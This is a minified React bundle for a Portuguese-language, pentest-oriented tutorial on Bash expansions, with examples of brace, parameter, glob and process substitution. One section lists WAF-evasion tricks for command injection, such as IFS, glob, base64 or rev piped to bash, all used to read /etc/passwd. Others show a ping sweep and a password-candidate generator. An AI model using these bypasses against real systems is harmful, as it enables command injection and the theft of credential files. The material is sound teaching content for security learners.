import{j as e}from"./index-CAFCz3B4.js";import{P as s}from"./PageContainer-CxmWgrx_.js";import{A as r}from"./AlertBox-Dze8I6Zt.js";import{C as a}from"./CodeBlock-C6bWIuPM.js";import{C as t}from"./CommandTable-CZCYoWRB.js";import{T as o,P as i}from"./PracticeBox-BDRu97pg.js";function l(){return e.jsxs(s,{title:"Expansões do Bash",subtitle:"Brace, tilde, parameter, command, arithmetic, glob, history, process substitution e heredocs.",difficulty:"intermediario",timeToRead:"16 min",children:[e.jsx("h2",{children:"Por que isso importa"}),e.jsxs("p",{children:["O Bash faz ",e.jsx("strong",{children:"oito tipos"})," de expansão antes de executar um comando, em ordem específica. Entender essa ordem é o que separa o user que digita comandos do operador que constrói one-liners afiados, payloads sem aspas e bypass de filtros WAF."]}),e.jsx(a,{language:"bash",title:"ordem de expansão (memorize)",code:`# 1. brace expansion              {a,b,c}        →  a b c
# 2. tilde expansion               ~              →  /home/ana
# 3. parameter / variable          \${var}, $var
# 4. command substitution          $(cmd) ou \`cmd\`
# 5. arithmetic expansion          $((1+1))       →  2
# 6. process substitution          <(cmd) >(cmd)
# 7. word splitting (em IFS)
# 8. pathname / glob expansion     *.txt          →  a.txt b.txt
#
# E ANTES de tudo isso: history expansion (!!, !$, !cmd) acontece na leitura.`}),e.jsx("h2",{children:"1. Brace expansion"}),e.jsx(o,{path:"~",lines:[{cmd:"echo {a,b,c}.txt",out:"a.txt b.txt c.txt",outType:"info"},{cmd:"echo arquivo.{bak,old,orig}",out:"arquivo.bak arquivo.old arquivo.orig",outType:"info"},{comment:"ranges numéricos e de letras",cmd:"echo {1..10}",out:"1 2 3 4 5 6 7 8 9 10",outType:"default"},{cmd:"echo {01..05}",out:"01 02 03 04 05",outType:"default"},{comment:"step (3o argumento)",cmd:"echo {0..20..5}",out:"0 5 10 15 20",outType:"default"},{cmd:"echo {a..f}",out:"a b c d e f",outType:"default"},{comment:"uso prático: gerar IPs de uma /24 pra ping sweep",cmd:"for ip in 10.10.10.{1..254}; do (ping -c1 -W1 $ip &>/dev/null && echo UP $ip) & done; wait | head -5",out:`UP 10.10.10.1
UP 10.10.10.5
UP 10.10.10.7
UP 10.10.10.50
UP 10.10.10.220`,outType:"success"},{comment:"backup rápido sem digitar duas vezes",cmd:"cp /etc/nginx/nginx.conf{,.bak}",out:"(equivale a: cp /etc/nginx/nginx.conf /etc/nginx/nginx.conf.bak)",outType:"muted"}]}),e.jsx("h2",{children:"2. Tilde expansion"}),e.jsx(t,{title:"formas do ~",variations:[{cmd:"~",desc:"Seu HOME.",output:"/home/ana"},{cmd:"~root",desc:"Home do user root.",output:"/root"},{cmd:"~+",desc:"$PWD (diretório atual).",output:"/tmp/loot"},{cmd:"~-",desc:"$OLDPWD (anterior).",output:"Útil pra alternar com cd -."},{cmd:"cd ~/tools",desc:"Vai para /home/ana/tools.",output:"Funciona em qualquer comando."}]}),e.jsx("h2",{children:"3. Parameter expansion (avançado)"}),e.jsxs("p",{children:["A expansão de parâmetros vai MUITO além de ",e.jsx("code",{children:"$var"}),". Bash tem dezenas de operadores para extrair, substituir, padding, default, etc. Não precisa decorar: precisa SABER QUE EXISTE para procurar quando precisar."]}),e.jsx(a,{language:"bash",title:"cheatsheet de \\${var...}",code:`var="hello world"

\${var}              # hello world
\${#var}             # 11        — tamanho da string
\${var:6}            # world     — substring desde índice 6
\${var:0:5}          # hello     — substring [0,5)
\${var: -5}          # world     — últimos 5 (cuidado com o espaço antes do -)

\${var/world/bash}   # hello bash       — substitui PRIMEIRA ocorrência
\${var//l/L}         # heLLo worLd      — substitui TODAS
\${var/#hello/hi}    # hi world         — substitui só se começa com
\${var/%world/dev}   # hello dev        — substitui só se termina com

\${var^}             # Hello world      — primeira em maiúscula
\${var^^}            # HELLO WORLD      — tudo maiúscula
\${var,}             # hello world      — primeira em minúscula
\${var,,}            # hello world      — tudo minúscula

# Default values
\${var:-default}     # se vazio/unset, usa "default"
\${var:=default}     # idem, mas TAMBÉM atribui à var
\${var:?msg}         # se vazio, sai com erro "msg"
\${var:+other}       # se NÃO vazio, usa "other"

# Trim de prefixo/sufixo (com glob)
arquivo="/var/log/nginx/access.log"
\${arquivo#*/}       # var/log/nginx/access.log     — remove menor prefixo
\${arquivo##*/}      # access.log                    — remove maior prefixo
\${arquivo%/*}       # /var/log/nginx                — remove menor sufixo
\${arquivo%%/*}      # (vazio)                       — remove maior sufixo
\${arquivo%.log}.bak # /var/log/nginx/access.bak     — troca extensão`}),e.jsx(o,{path:"~",lines:[{cmd:"url='https://target.com:8443/admin/panel?id=42'",out:"(silencioso)",outType:"muted"},{comment:"tirar protocolo",cmd:'echo "${url#*://}"',out:"target.com:8443/admin/panel?id=42",outType:"info"},{comment:"extrair só o host:porta",cmd:'host="${url#*://}"; echo "${host%%/*}"',out:"target.com:8443",outType:"info"},{comment:"default se var não definida (fallback no script)",cmd:'echo "PORTA=${PORT:-4444}"',out:"PORTA=4444",outType:"default"}]}),e.jsx("h2",{children:"4. Command substitution"}),e.jsx(o,{path:"~",lines:[{cmd:'data=$(date +%Y-%m-%d); echo "backup-$data.tar.gz"',out:"backup-2026-04-03.tar.gz",outType:"info"},{comment:"forma legada com backticks (evite — não aninha bem)",cmd:'echo "hostname: `hostname`"',out:"hostname: kali",outType:"muted"},{comment:"aninhamento múltiplo (só $() permite)",cmd:'echo "você é $(whoami) no $(uname -s)/$(uname -m)"',out:"você é ana no Linux/x86_64",outType:"success"},{comment:"uso clássico em pentest: pegar IP da tun0 (HTB/THM)",cmd:`ip=$(ip -4 -o addr show tun0 | awk '{print $4}' | cut -d/ -f1); echo "meu IP no lab: $ip"`,out:"meu IP no lab: 10.10.14.7",outType:"warning"}]}),e.jsx("h2",{children:"5. Arithmetic expansion"}),e.jsx(o,{path:"~",lines:[{cmd:"echo $((2 + 3 * 4))",out:"14",outType:"info"},{cmd:"echo $((2**16))",out:"65536",outType:"info"},{cmd:"echo $((0xff))",out:"255",outType:"default"},{cmd:"echo $((0b1010))",out:"10",outType:"default"},{comment:"incrementar variável",cmd:"i=10; ((i++)); echo $i",out:"11",outType:"default"},{comment:"loop estilo C",cmd:'for ((i=1; i<=5; i++)); do echo "req $i"; done',out:`req 1
req 2
req 3
req 4
req 5`,outType:"muted"}]}),e.jsx("h2",{children:"6. Pathname / glob"}),e.jsx(t,{title:"curingas",variations:[{cmd:"*",desc:"Qualquer sequência (incluindo vazia), exceto começando com ponto.",output:"ls *.txt"},{cmd:"?",desc:"Exatamente UM caractere.",output:"ls log?.txt → log1.txt log2.txt"},{cmd:"[abc]",desc:"Um caractere de um conjunto.",output:"[0-9]*.log"},{cmd:"[!abc] ou [^abc]",desc:"Negação do conjunto.",output:"*.[!o]      ←  arquivos com extensão diferente de 'o'"},{cmd:"**",desc:"Recursivo (precisa shopt -s globstar).",output:"ls **/*.php  →  todos os .php em qualquer subdir"},{cmd:"!(pat)",desc:"Não casa com o padrão (extglob).",output:"ls !(*.bak)  ← tudo menos .bak"},{cmd:"?(pat)",desc:"Zero ou um (extglob).",output:"Precisa shopt -s extglob."},{cmd:"+(pat)",desc:"Um ou mais.",output:"extglob."},{cmd:"*(pat)",desc:"Zero ou mais.",output:"extglob."},{cmd:"@(pat1|pat2)",desc:"Exatamente um.",output:"ls *.@(jpg|png|gif)"}]}),e.jsx(o,{path:"~",lines:[{cmd:"shopt -s globstar extglob",out:"(silencioso)",outType:"muted"},{comment:"achar TODOS os .php debaixo de /var/www",cmd:"ls /var/www/**/*.php | head",out:`/var/www/html/index.php
/var/www/html/wp-config.php
/var/www/html/wp-admin/admin.php
/var/www/html/wp-includes/load.php`,outType:"info"},{comment:"remover tudo menos .conf",cmd:"rm /tmp/teste/!(*.conf)",out:"(removidos os outros)",outType:"warning"}]}),e.jsx("h2",{children:"7. Process substitution"}),e.jsx("p",{children:"Permite usar a saída de um comando como se fosse um arquivo, sem precisar criar arquivo temporário. Vital para combinar comandos que esperam path em vez de stdin."}),e.jsx(o,{path:"~",lines:[{comment:"diff entre saídas de dois comandos",cmd:"diff <(ls /etc) <(ssh root@target ls /etc) | head",out:`5a6
> apache2`,outType:"info"},{comment:"comparar resultados de duas wordlists usadas",cmd:"comm -12 <(sort wordA.txt) <(sort wordB.txt) | head",out:`admin
password
qwerty
root`,outType:"default"},{comment:"alimentar tee com vários destinos",cmd:"echo 'log' | tee >(gzip > saida.gz) >(wc -c > tamanho.txt) > /dev/null",out:"(silencioso — saida.gz e tamanho.txt criados)",outType:"muted"}]}),e.jsx("h2",{children:"8. Heredocs e herestrings"}),e.jsx(a,{language:"bash",title:"heredoc — texto multi-linha embutido",code:`# Sintaxe básica
cat <<EOF
Olá, $USER
Hoje é $(date +%A)
EOF

# Sem expansão de variáveis (aspas no delimitador)
cat <<'EOF'
$USER fica literal
$(date) também
EOF

# Indentação com tab (-) — útil em scripts indentados
cat <<-EOF
        a indentação por TAB é removida
        permite alinhar bonito no script
        EOF

# Herestring — uma única linha
base64 -d <<< "aGVsbG8K"
# → hello

# Útil pra scripts/payloads remotos
ssh user@target 'bash -s' <<'EOF'
hostname
id
uname -a
EOF`}),e.jsx("h2",{children:"Shell expansion abuse — bypass de filtros"}),e.jsxs("p",{children:["Atacantes web abusam dessas expansões para contornar filtros WAF que bloqueiam palavras como ",e.jsx("code",{children:"cat"}),", ",e.jsx("code",{children:"id"})," ou ",e.jsx("code",{children:"/etc/passwd"}),". As técnicas abaixo são usadas em command injection / RCE bug bounty."]}),e.jsx(a,{language:"bash",title:"bypass tricks usando expansões",code:`# 1. Brace concatenando — palavra 'cat' não aparece literal
{ca,t} /etc/passwd

# 2. Aspas vazias no meio quebram match exato
c""at /etc/passwd
c''at /etc/passwd
c\\at /etc/passwd

# 3. Variáveis vazias quebram a string
ca\${SHELL:0:0}t /etc/passwd

# 4. Glob expansion para o path
cat /???/p?ss??

# 5. Reverse via rev
rev <<< "dwssap/cte/ tac" | bash

# 6. Base64 + bash
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# 7. Variável de ambiente carregando o comando
X=cat; $X /etc/passwd

# 8. IFS bypass de espaços bloqueados
cat\${IFS}/etc/passwd
cat$IFS/etc/passwd

# 9. Tab em vez de espaço (codepoint diferente)
cat$'\\t'/etc/passwd

# 10. Backslash no meio
c\\at /e\\tc/p\\asswd`}),e.jsx(o,{path:"~",lines:[{cmd:"{ca,t} /etc/passwd | head -2",out:`root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin`,outType:"warning"},{cmd:"echo ana | rev",out:"nosyllaw",outType:"info"},{comment:"execução por glob — nem 'cat' nem 'passwd' aparecem",cmd:"/???/c?t /e?c/p?ss?d | head -1",out:"root:x:0:0:root:/root:/usr/bin/zsh",outType:"warning"}]}),e.jsx("h2",{children:"IFS — o split que ninguém vê"}),e.jsxs("p",{children:[e.jsx("code",{children:"IFS"})," (Internal Field Separator) é o caractere que o Bash usa para quebrar palavras após as expansões. Padrão: espaço, tab, newline. Mexer no IFS permite parsing custom mas também é vetor de injection."]}),e.jsx(o,{path:"~",lines:[{cmd:"linha='root:x:0:0:root:/root:/bin/bash'",out:"(silencioso)",outType:"muted"},{cmd:'IFS=: read user pw uid gid info home shell <<< "$linha"; echo "$user $home"',out:"root /root",outType:"info"},{comment:"IFS resetado",cmd:"IFS=$' \\t\\n'",out:"(default)",outType:"muted"}]}),e.jsx(i,{title:"One-liner: gere 100 senhas candidatas com brace + ano",goal:"Combinar uma wordlist base com sufixos numéricos usando expansões.",steps:["Use brace expansion para gerar variações de uma palavra base.","Combine com ranges para anos comuns (2020-2026).","Saída deve ter ~70 candidatos únicos."],command:`base=( admin senha root user master )
for b in "\${base[@]}"; do
  echo \${b}{,123,!,@}{2020..2026}
done | tr ' ' '\\n' | sort -u | head -10
echo "---"
for b in "\${base[@]}"; do
  echo \${b}{,123,!,@}{2020..2026}
done | tr ' ' '\\n' | sort -u | wc -l`,expected:`admin!2020
admin!2021
admin!2022
admin!2023
admin!2024
admin!2025
admin!2026
admin1232020
admin1232021
admin1232022
---
140`,verify:"O wc -l retorna 140 (5 bases × 4 sufixos × 7 anos = 140 candidatos), todos gerados sem nenhum loop manual graças à brace expansion."}),e.jsxs(r,{type:"info",title:"Ordem importa",children:["Se você fizer ",e.jsx("code",{children:"echo {a,b}.{1..3}"})," obtém 6 resultados, mas",e.jsx("code",{children:" echo $X.{1..3}"})," só expande os números — porque variável é expandida DEPOIS da brace. Para casos onde a ordem atrapalha, use ",e.jsx("code",{children:"eval"})," com MUITO cuidado ou reestruture com ",e.jsx("code",{children:"printf"}),"."]})]})}export{l as default};
